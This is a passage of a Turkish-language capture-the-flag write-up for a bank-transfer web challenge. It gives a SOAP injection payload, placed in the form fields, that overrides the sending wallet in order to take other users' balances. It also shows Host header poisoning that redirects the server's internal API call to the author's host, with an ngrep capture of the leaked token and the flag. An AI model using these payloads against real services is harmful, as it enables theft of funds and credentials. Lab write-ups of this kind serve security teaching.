+</span><span style="color:#657b83;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span style="color:#657b83;">Accept-Language: en-GB,en;q=0.5
+</span><span style="color:#657b83;">Accept-Encoding: gzip, deflate
+</span><span style="color:#657b83;">Referer: http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/transfer.php
+</span><span style="color:#657b83;">Content-Type: application/x-www-form-urlencoded
+</span><span style="color:#657b83;">Content-Length: 24
+</span><span style="color:#657b83;">Cookie: PHPSESSID=xxx
+</span><span style="color:#657b83;">DNT: 1
+</span><span style="color:#657b83;">Connection: close
+</span><span style="color:#657b83;">Upgrade-Insecure-Requests: 1
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">receiver=1828&amp;amount=123
+</span>
+</code></pre>
+<p>Istekte giden parametreler arasinda <code>receiver</code> ve <code>amount</code> olmasi bir once gordugumuz bakiye yollama endpointi ile tutuyordu. Bundan dolayi <code>SOAP injection</code> denenebilir.</p>
+<h3>Çözüm 1: SOAP injection</h3>
+<p>Aklimizda olsuturdugumuz hedeflenen injection assagida gorunmektedir:</p>
+<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">receiver_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1828</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">receiver_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">sender_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">sender_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">amount </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;&lt;!--&lt;/receiver_wallet_num&gt;
+</span><span style="color:#93a1a1;">&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1000&lt;/sender_wallet_num&gt;
+</span><span style="color:#93a1a1;">&lt;amount xsi:type=&quot;xsd:float&quot;&gt;--&gt;</span><span style="color:#657b83;">1000</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">amount</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">token </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:string</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">token</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">token</span><span style="color:#93a1a1;">&gt;
+</span>
+</code></pre>
+<p><strong>receiver</strong> kısmına;</p>
+<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<span style="color:#657b83;">hesapNumaram </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">receiver_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">sender_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">sender_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">amount </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;&lt;!--
+</span>
+</code></pre>
+<p><strong>amount</strong> kısmına ise;</p>
+<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<span style="color:#657b83;">--&gt; 200
+</span>
+</code></pre>
+<p>Fakat nedense hesabimiza paralar yuklenmedi. Sonra dusununce hedefte yeterince para olmayabilir. Bundan dolayi belli bir aralikta ki herkesin bakiyesini calmaya calistik.</p>
+<p><img src="3.png" alt="" /></p>
+<h3>Çözüm 2: Host header poisoning</h3>
+<pre lang="http" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">POST /home/transfer.php HTTP/1.1
+</span><span style="color:#657b83;">Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
+</span><span style="color:#657b83;">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+</span><span style="color:#657b83;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span style="color:#657b83;">Accept-Language: en-GB,en;q=0.5
+</span><span style="color:#657b83;">Accept-Encoding: gzip, deflate
+</span><span style="color:#657b83;">Referer: http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/transfer.php
+</span><span style="color:#657b83;">Content-Type: application/x-www-form-urlencoded
+</span><span style="color:#657b83;">Content-Length: 24
+</span><span style="color:#657b83;">Cookie: PHPSESSID=xxx
+</span><span style="color:#657b83;">DNT: 1
+</span><span style="color:#657b83;">Connection: close
+</span><span style="color:#657b83;">Upgrade-Insecure-Requests: 1
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">receiver=1828&amp;amount=123
+</span>
+</code></pre>
+<p>Alakali istekte <code>host header injection</code> oldugunu farkettik. Boylece endpointi zehirleyip api istegindeki tokeni calabiliriz.</p>
+<pre lang="bash" style="background-color:#fdf6e3;"><code>
+<span style="color:#b58900;">ngrep</span><span style="color:#268bd2;"> -q -d</span><span style="color:#657b83;"> ens160</span><span style="color:#268bd2;"> -W</span><span style="color:#657b83;"> byline port 80
+</span>
+</code></pre>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">root@cd0:~# ngrep -q -d ens160 -W byline port 80
+</span><span style="color:#657b83;">interface: ens160 (x.x.x.x/255.255.255.224)
+</span><span style="color:#657b83;">filter: (ip or ip6) and ( port 80 )
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.120:10101 -&gt; my.ip.v4.addr:80 [A]
+</span><span style="color:#657b83;">......
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.120:10101 -&gt; my.ip.v4.addr:80 [AP]
+</span><span style="color:#657b83;">GET /api/bankservice.wsdl.php HTTP/1.1.
+</span><span style="color:#657b83;">Host: cd0.me.
+</span><span style="color:#657b83;">Connection: Keep-Alive.
+</span><span style="color:#657b83;">Accept-Encoding: gzip.
+</span><span style="color:#657b83;">CF-IPCountry: DE.
+</span><span style="color:#657b83;">X-Forwarded-For: 18.184.147.62.
+</span><span style="color:#657b83;">CF-RAY: 43ecd60df1ef63a3-FRA.
+</span><span style="color:#657b83;">X-Forwarded-Proto: http.
+</span><span style="color:#657b83;">CF-Visitor: {&quot;scheme&quot;:&quot;http&quot;}.
+</span><span style="color:#657b83;">CF-Connecting-IP: 18.184.147.62.
+</span><span style="color:#657b83;">.
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T my.ip.v4.addr:80 -&gt; 162.158.89.120:10101 [A]
+</span><span style="color:#657b83;">HTTP/1.1 200 OK.
+</span><span style="color:#657b83;">Date: Mon, 23 Jul 2018 08:39:22 GMT.
+</span><span style="color:#657b83;">Server: Apache/2.4.18 (Ubuntu).
+</span><span style="color:#657b83;">Last-Modified: Mon, 23 Jul 2018 07:31:21 GMT.
+</span><span style="color:#657b83;">ETag: &quot;b5b-571a5a1ce14ac&quot;.
+</span><span style="color:#657b83;">Accept-Ranges: bytes.
+</span><span style="color:#657b83;">Content-Length: 2907.
+</span><span style="color:#657b83;">Keep-Alive: timeout=5, max=100.
+</span><span style="color:#657b83;">Connection: Keep-Alive.
+</span><span style="color:#657b83;">.
+</span><span style="color:#657b83;">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definitions name=&quot;Bank&quot;
+</span><span style="color:#657b83;">             targetNamespace=&quot;urn:Bank&quot;
+</span><span style="color:#657b83;">             xmlns:tns=&quot;urn:Bank&quot;
+</span><span style="color:#657b83;">             xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;
+</span><span style="color:#657b83;">             xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
+</span><span style="color:#657b83;">             xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;
+</span><span style="color:#657b83;">             xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot;
+</span><span style="color:#657b83;">             xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    &lt;message name=&quot;BalanceRequest&quot;&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+</span><span style="color:#657b83;">    &lt;/message&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    &lt;message name=&quot;BalanceResponse&quot;&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;
+</span><span style="color:#657b83;">    &lt;/message&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    &lt;message name=&quot;internalTransferRequest&quot;&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;receiver_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;sender_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;amount&quot; type=&quot;xsd:float&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;token&quot; type=&quot;xsd:string&quot;/&gt;
+</span><span style="color:#657b83;">    &lt;/message&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    &lt;message name=&quot;internalTransferResponse&quot;&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;
+</span><span style="color:#657b83;">    &lt;/message&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    &lt;portType name=&quot;BankServicePort&quot;&gt;
+</span><span style="color:#657b83;">        &lt;operation name=&quot;requestBalance&quot;&gt;
+</span><span style="color:#657b83;">            &lt;input message=&quot;tns:BalanceRequest&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;output message=&quot;tns:BalanceResponse&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;/operation&gt;
+</span><span style="color:#657b83;">        &lt;operation name=&quot;internalTransfer&quot;&gt;
+</span><span style="color:#657b83;">            &lt;input message=&quot;tns:internalTransferRequest&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;output message=&quot;tns:internalTransferResponse&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;/operation&gt;
+</span><span style="color:#657b83;">    &lt;/portType&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    &lt;binding name=&quot;BankServiceBinding&quot; type=&quot;tns:BankServicePort&quot;&gt;
+</span><span style="color:#657b83;">        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;
+</span><span style="color:#657b83;">        &lt;operation name=&quot;requestBalance&quot;&gt;
+</span><span style="color:#657b83;">            &lt;soap:operation soapAction=&quot;urn:requestBalanceAction&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;input&gt;
+</span><span style="color:#657b83;">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;/input&gt;
+</span><span style="color:#657b83;">            &lt;output&gt;
+</span><span style="color:#657b83;">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;/output&gt;
+</span><span style="color:#657b83;">        &lt;/operation&gt;
+</span><span style="color:#657b83;">        &lt;operation name=&quot;internalTransfer&quot;&gt;
+</span><span style="color:#657b83;">            &lt;soap:operation soapAction=&quot;urn:internalTransferAction&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;input&gt;
+</span><span style="color:#657b83;">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;/input&gt;
+</span><span style="color:#657b83;">            &lt;output&gt;
+</span><span style="color:#657b83;">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+</span><span style="color:#657b83;">            &lt;/output&gt;
+</span><span style="color:#657b83;">        &lt;/operation&gt;
+</span><span style="color:#657b83;">    &lt;/binding&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">    &lt;wsdl:service name=&quot;BankSer
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T my.ip.v4.addr:80 -&gt; 162.158.89.120:10101 [AP]
+</span><span style="color:#657b83;">vice&quot;&gt;
+</span><span style="color:#657b83;">        &lt;wsdl:port name=&quot;BankServicePort&quot; binding=&quot;tns:BankServiceBinding&quot;&gt;
+</span><span style="color:#657b83;">            &lt;soap:address location=&quot;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&quot; /&gt;
+</span><span style="color:#657b83;">        &lt;/wsdl:port&gt;
+</span><span style="color:#657b83;">    &lt;/wsdl:service&gt;
+</span><span style="color:#657b83;">&lt;/wsdl:definitions&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.120:10101 -&gt; my.ip.v4.addr:80 [A]
+</span><span style="color:#657b83;">......
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.120:10101 -&gt; my.ip.v4.addr:80 [A]
+</span><span style="color:#657b83;">......
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.120:10101 -&gt; my.ip.v4.addr:80 [A]
+</span><span style="color:#657b83;">......
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.252:15529 -&gt; my.ip.v4.addr:80 [A]
+</span><span style="color:#657b83;">......
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.252:15529 -&gt; my.ip.v4.addr:80 [AP]
+</span><span style="color:#657b83;">POST /api/bankservice.php HTTP/1.1.
+</span><span style="color:#657b83;">Host: cd0.me.
+</span><span style="color:#657b83;">Connection: Keep-Alive.
+</span><span style="color:#657b83;">Accept-Encoding: gzip.
+</span><span style="color:#657b83;">CF-IPCountry: DE.
+</span><span style="color:#657b83;">X-Forwarded-For: 18.184.147.62.
+</span><span style="color:#657b83;">CF-RAY: 43ecd60eb012268a-FRA.
+</span><span style="color:#657b83;">Content-Length: 736.
+</span><span style="color:#657b83;">X-Forwarded-Proto: http.
+</span><span style="color:#657b83;">CF-Visitor: {&quot;scheme&quot;:&quot;http&quot;}.
+</span><span style="color:#657b83;">User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.
+</span><span style="color:#657b83;">Content-Type: application/soap+xml; charset=utf-8; action=&quot;internalTransferAction&quot;.
+</span><span style="color:#657b83;">CF-Connecting-IP: 18.184.147.62.
+</span><span style="color:#657b83;">.
+</span><span style="color:#657b83;">&lt;SOAP-ENV:Envelope SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+</span><span style="color:#657b83;">      &lt;SOAP-ENV:Body&gt;
+</span><span style="color:#657b83;">        &lt;ns1:internalTransfer&gt;
+</span><span style="color:#657b83;">          &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/receiver_wallet_num&gt;
+</span><span style="color:#657b83;">          &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1349&lt;/sender_wallet_num&gt;
+</span><span style="color:#657b83;">          &lt;amount xsi:type=&quot;xsd:float&quot;&gt;1&lt;/amount&gt;
+</span><span style="color:#657b83;">          &lt;token xsi:type=&quot;xsd:token&quot;&gt;somesupertokenkey1235555&lt;/token&gt;
+</span><span style="color:#657b83;">        &lt;/ns1:internalTransfer&gt;
+</span><span style="color:#657b83;">      &lt;/SOAP-ENV:Body&gt;
+</span><span style="color:#657b83;">    &lt;/SOAP-ENV:Envelope&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T my.ip.v4.addr:80 -&gt; 162.158.89.252:15529 [AP]
+</span><span style="color:#657b83;">HTTP/1.1 404 Not Found.
+</span><span style="color:#657b83;">Date: Mon, 23 Jul 2018 08:39:22 GMT.
+</span><span style="color:#657b83;">Server: Apache/2.4.18 (Ubuntu).
+</span><span style="color:#657b83;">Content-Length: 289.
+</span><span style="color:#657b83;">Keep-Alive: timeout=5, max=100.
+</span><span style="color:#657b83;">Connection: Keep-Alive.
+</span><span style="color:#657b83;">Content-Type: text/html; charset=iso-8859-1.
+</span><span style="color:#657b83;">.
+</span><span style="color:#657b83;">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+</span><span style="color:#657b83;">&lt;html&gt;&lt;head&gt;
+</span><span style="color:#657b83;">&lt;title&gt;404 Not Found&lt;/title&gt;
+</span><span style="color:#657b83;">&lt;/head&gt;&lt;body&gt;
+</span><span style="color:#657b83;">&lt;h1&gt;Not Found&lt;/h1&gt;
+</span><span style="color:#657b83;">&lt;p&gt;The requested URL /api/bankservice.php was not found on this server.&lt;/p&gt;
+</span><span style="color:#657b83;">&lt;hr&gt;
+</span><span style="color:#657b83;">&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at cd0.me Port 80&lt;/address&gt;
+</span><span style="color:#657b83;">&lt;/body&gt;&lt;/html&gt;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.252:15529 -&gt; my.ip.v4.addr:80 [A]
+</span><span style="color:#657b83;">......
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.120:10101 -&gt; my.ip.v4.addr:80 [AF]
+</span><span style="color:#657b83;">......
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">T 162.158.89.252:15529 -&gt; my.ip.v4.addr:80 [AF]
+</span>
+</code></pre>
+<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">SOAP-ENV:Envelope </span><span style="color:#b58900;">SOAP-ENV:encodingStyle</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:SOAP-ENC</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:SOAP-ENV</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/envelope/</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:ns1</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:xsd</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://www.w3.org/2001/XMLSchema</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:xsi</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://www.w3.org/2001/XMLSchema-instance</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">SOAP-ENV:Body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">ns1:internalTransfer</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">          </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">receiver_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1340</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">receiver_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">          </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">sender_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1349</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">sender_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">          </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">amount </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">amount</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">          </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">token </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:token</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">somesupertokenkey1235555</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">token</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">ns1:internalTransfer</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">SOAP-ENV:Body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">SOAP-ENV:Envelope</span><span style="color:#93a1a1;">&gt;
+</span>
+</code></pre>
+<p>hostu zehirledigimizden mutevellit api istegi bize geri dondu. boyleci token expose edilmis oldu <code>somesupertokenkey1235555</code></p>
+<p>ve flag</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">ctfzone{dcaa1f2047501ac0f4ae6f448082e63e}
+</span>
+</code></pre>
+</html>
